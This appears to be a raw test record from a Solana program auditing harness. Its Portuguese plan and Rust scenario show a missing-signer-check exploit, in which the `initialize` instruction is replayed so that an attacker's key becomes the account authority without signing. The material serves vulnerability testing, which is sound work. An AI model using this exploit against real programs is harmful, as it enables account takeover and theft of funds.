attempts.raw:
{
  "plan": "O programa native `initialize` recebe duas contas: `user` (gravável, 32 bytes) e `authority_info`. O baseline usa uma autoridade legítima que assina a transação e grava sua chave na conta `user`. O ataque repete a mesma instrução, mas remove a assinatura da autoridade, passando uma chave controlada pelo atacante. O efeito medido é que a conta `user` passa a ter como autoridade a chave do atacante, sem que ele tenha assinado.",
  "scenario": "let user_key = Pubkey::new_unique();
let legit_authority = Pubkey::new_unique();
let attacker_authority = Pubkey::new_unique();

let user_account = account(&env.program_id, &[0u8; 32], None);

let ix_data = vec![0u8]; // discriminador de Init {}

let metas_legit = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(legit_authority, true),
];
let ix_legit = env.raw_ix(&ix_data, metas_legit);
let contas_legit = vec![
    (user_key, user_account.clone()),
    (legit_authority, wallet(1_000_000)),
];
let r_legit = env.baseline("initialize legitimo com autoridade signer", &ix_legit, &contas_legit);

let user_after_legit = after(&r_legit, &user_key).clone();

let metas_attack = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(attacker_authority, false),
];
let ix_attack = env.raw_ix(&ix_data, metas_attack);
let contas_attack = vec![
    (user_key, user_after_legit),
    (attacker_authority, wallet(1_000_000)),
];
let r_attack = env.attack("initialize sem assinatura da autoridade", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let authority_gravada = read_pubkey(after(&r_attack, &user_key).data(), 0);
    env.effect("autoridade da conta user foi definida para a chave do atacante sem assinatura", authority_gravada == attacker_authority);
}"
}

